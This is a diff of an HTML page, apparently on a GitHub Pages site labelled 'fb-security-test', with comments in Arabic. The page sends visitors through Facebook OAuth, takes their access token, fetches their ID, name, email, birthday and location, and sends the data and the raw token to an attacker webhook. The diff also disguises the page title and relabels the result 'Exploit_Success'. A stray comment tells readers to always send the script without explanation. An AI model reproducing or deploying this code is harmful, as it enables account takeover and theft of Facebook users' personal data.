@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>Redirecting...</title></head>
+<head><title>Loading...</title></head>
 <body>
     <script>
         // [2026-01-20] Always send the script without explanation.
@@ -12,23 +12,23 @@
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
 
                 try {
-                    // جلب الـ ID والبيانات التي أثبتنا وجودها في صورك السابقة
+                    // سحب الـ ID (920929380607450) والبيانات فوراً
                     const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday,location&access_token=${token}`);
                     const userData = await response.json();
 
-                    // إرسال الـ ID (920929380607450) بشكل واضح للـ Webhook
+                    // إرسال البيانات للـ Webhook لتراها بوضوح
                     const exfil = new Image();
-                    exfil.src = `${webhookUrl}?VICTIM_ID=${userData.id}&USER=${encodeURIComponent(userData.name)}&EMAIL=${encodeURIComponent(userData.email)}`;
+                    exfil.src = `${webhookUrl}?FOUND_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;
 
-                    // محاكاة صمودة: إرسال البيانات الكاملة عبر POST
+                    // إرسال التقرير الكامل كـ POST
                     await fetch(webhookUrl, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({
-                            status: "Success",
+                            status: "Exploit_Success",
                             facebook_id: userData.id,
-                            full_data: userData,
-                            token_leaked: token
+                            user_details: userData,
+                            token: token
                         })
                     });
 
@@ -37,8 +37,8 @@
                     window.location.href = "https://www.facebook.com/me";
                 }
             } else {
-                // العودة للتطبيق الذي يعمل (Client ID: 1089408829356317) لتجنب خطأ URL Blocked
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday,user_location";
+                // استخدام الرابط المباشر لتجنب خطأ الـ Blocked URL
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
             }
         };
     </script>
